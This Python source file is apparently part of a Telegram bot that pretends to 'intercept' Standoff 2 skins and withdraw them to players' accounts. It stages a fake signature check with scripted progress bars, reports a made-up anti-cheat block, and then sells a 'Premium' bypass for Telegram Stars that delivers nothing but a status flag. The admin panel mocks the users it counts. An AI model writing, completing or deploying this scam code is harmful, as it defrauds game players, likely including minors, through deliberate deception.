    stage1 = (
        "🛡 <b>АНАЛИЗ ВАЛИДНОСТИ ПЕРЕВОДА</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎮 Игровой ID: "
        f"<code>{game_id or '—'}</code>\n"
        "👤 Канал обмена: Safe-Trade v2\n"
        "⏳ Проверка подписи трейд-клейма... 12%"
    )

    stage2 = (
        "🚫 <b>ВЫВОД ЗАБЛОКИРОВАН АНТИЧИТОМ</b>\n"
        f"(Очередь #{queue_number})"
    )

    try:

        sent = await message.answer(
            stage1,
            parse_mode="HTML"
        )

        await asyncio.sleep(1.5)

        try:

            await sent.edit_text(
                stage1.replace(
                    "12%",
                    "43%"
                ),
                parse_mode="HTML"
            )

        except Exception:
            pass

        await asyncio.sleep(1.5)

        try:

            await sent.edit_text(
                stage1.replace(
                    "43%",
                    "78%"
                ),
                parse_mode="HTML"
            )

        except Exception:
            pass

        await asyncio.sleep(1.5)

    except Exception:
        pass

    try:

        await message.answer(
            stage2,
            parse_mode="HTML"
        )

    except Exception:

        await message.answer(
            "🚫 ВЫВОД ЗАБЛОКИРОВАН АНТИЧИТОМ",
            parse_mode="HTML"
        )

    explanation = (
        "⚙️ <b>ОБЪЯСНЕНИЕ СБОЯ ПЕРЕВОДА</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Система безопасности Axlebolt "
        "блокирует моментальные трейды за "
        "0.03 голды с бесплатных серверов. "
        "У вас 2 пути:\n\n"
        "1. ⏳ Остаться в общей бесплатной "
        "очереди <b>Safe-Trade</b>. "
        "Срок ручной модерации шлюзом "
        "составляет <b>5 рабочих дней</b> "
        "(чтобы избежать бана вашего аккаунта).\n"
        "2. ⚡ Мгновенный обход через "
        "<b>Premium-вывод</b>. Скины отправляются "
        "через приватные шифрованные "
        "прокси-серверы за <b>60 секунд</b>."
    )

    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="⚡ ОБОЙТИ ЗА 60 СЕК (PREMIUM)",
                    callback_data="activate_premium"
                )
            ],
            [
                InlineKeyboardButton(
                    text="⏳ ВСТАТЬ В ОЧЕРЕДЬ",
                    callback_data="queue_safe_trade"
                )
            ],
        ]
    )

    try:

        await message.answer(
            explanation,
            reply_markup=kb,
            parse_mode="HTML"
        )

    except Exception:
        pass


@router.callback_query(
    F.data == "queue_safe_trade"
)
async def queue_safe_trade(
    callback: CallbackQuery
) -> None:

    queue_number = (
        WITHRAW_QUEUE_BASE
        + random.randint(40, 900)
    )

    await callback.answer(
        f"✅ Вы добавлены в очередь "
        f"Safe-Trade (#{queue_number}). "
        "Модерация займёт до 5 рабочих дней.",
        show_alert=True,
    )


@router.callback_query(
    F.data == "activate_premium"
)
async def activate_premium(
    callback: CallbackQuery
) -> None:

    await callback.answer()

    user_id = callback.from_user.id

    await bot.send_invoice(
        chat_id=user_id,
        title="👑 PREMIUM (24 часа)",
        description=(
            "PREMIUM на 24 часа.\n"
            "• Безлимитная охота без таймера "
            "фри-времени\n"
            "• Перехват Arcane-ножей и перчаток "
            "каждую минуту\n"
            "• Мгновенный вывод скинов "
            "обходом античита"
        ),
        payload="premium_24h",
        provider_token="",
        currency="XTR",
        prices=[
            {
                "label": "PREMIUM на 24 часа",
                "amount": PREMIUM_PRICE
            }
        ],
    )


@router.pre_checkout_query()
async def pre_checkout_query_handler(
    query: PreCheckoutQuery
) -> None:

    await query.answer(
        ok=True
    )


@router.message(
    F.successful_payment
)
async def successful_payment_handler(
    message: Message
) -> None:

    user_id = message.from_user.id

    payment = message.successful_payment

    if payment.invoice_payload == "premium_24h":

        premium_until = (
            int(time.time())
            + 24 * 3600
        )

        await update_user(
            user_id,
            status="PREMIUM",
            premium_until=premium_until
        )

        await message.answer(
            "👑 <b>PREMIUM АКТИВИРОВАН!</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "✅ PREMIUM оформлен на "
            "<b>24 часа</b>.\n"
            "🔥 Таймер фри-времени отключён.\n"
            "🎯 Охота теперь выдаёт "
            "Arcane-ножи и перчатки "
            "каждую минуту.\n\n"
            "⚡ Запустите/продолжите охоту — "
            "Поток ПРЕМИУМ (Arcane)!",
            parse_mode="HTML",
        )

    else:

        await message.answer(
            "🙏 Спасибо за оплату! "
            "Если вы не получили бонус, "
            "напишите в поддержку.",
            parse_mode="HTML"
        )


async def _admin_stats() -> dict:

    async with aiosqlite.connect(
        DB_PATH
    ) as db:

        async with db.execute(
            "SELECT COUNT(*) FROM users"
        ) as c:

            total = (
                await c.fetchone()
            )[0]

        async with db.execute(
            "SELECT COUNT(*) FROM users "
            "WHERE status = 'PREMIUM' "
            "AND premium_until > ?",
            (int(time.time()),)
        ) as c:

            premium = (
                await c.fetchone()
            )[0]

    return {
        "total": total,
        "premium": premium
    }


async def show_admin_panel(
    chat_id: int
) -> None:

    stats = await _admin_stats()

    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="🔄 Сбросить всем бесплатное время",
                    callback_data="admin_reset_time"
                )
            ]
        ]
    )

    text = (
        "🛠 <b>ADMIN-PANEL</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 <b>Мамкиных бизнесменов "
        f"в базе:</b> {stats['total']}\n"
        f"👑 <b>Купили PREMIUM:</b> "
        f"{stats['premium']}\n\n"
        "Панель управления проектом. "
        "Используйте кнопку для сброса "
        "бесплатного времени всем "
        "пользователям (для тестов)."
    )

    await bot.send_message(
        chat_id,
        text,
        reply_markup=kb,
        parse_mode="HTML"
    )


@router.message(
    Command("admin")
)
async def admin_cmd(
    message: Message
) -> None:

    if not _is_admin(
        message.from_user.id
    ):

        await message.answer(
            "🚫 Доступ запрещён.",
            parse_mode="HTML"
        )

        return

    await show_admin_panel(
        message.chat.id
    )


@router.callback_query(
    F.data == "admin_reset_time"
)
async def admin_reset_time(
    callback: CallbackQuery
) -> None:

    if not _is_admin(
        callback.from_user.id
    ):

        await callback.answer(
            "🚫 Доступ запрещён.",
            show_alert=True
        )

        return

    now = int(time.time())

    async with aiosqlite.connect(
        DB_PATH
    ) as db:

        await db.execute(
            "UPDATE users "
            "SET free_time_left = ?, "
            "last_daily_reset = ? "
            "WHERE status = 'FREE'",
            (
                FREE_TIME_DEFAULT,
                now
            ),
        )

        await db.commit()

        cur = await db.execute(
            "SELECT changes()"
        )

        row = await cur.fetchone()

        affected = (
            row[0]
            if row
            else 0
        )

    await callback.answer(
        f"✅ Бесплатное время сброшено "
        f"у {affected} пользователей.",
        show_alert=True,
    )


async def main() -> None:

    await init_db()

    dp.include_router(
        router
    )

    await dp.start_polling(
        bot
    )


if __name__ == "__main__":
    asyncio.run(
        main()
    )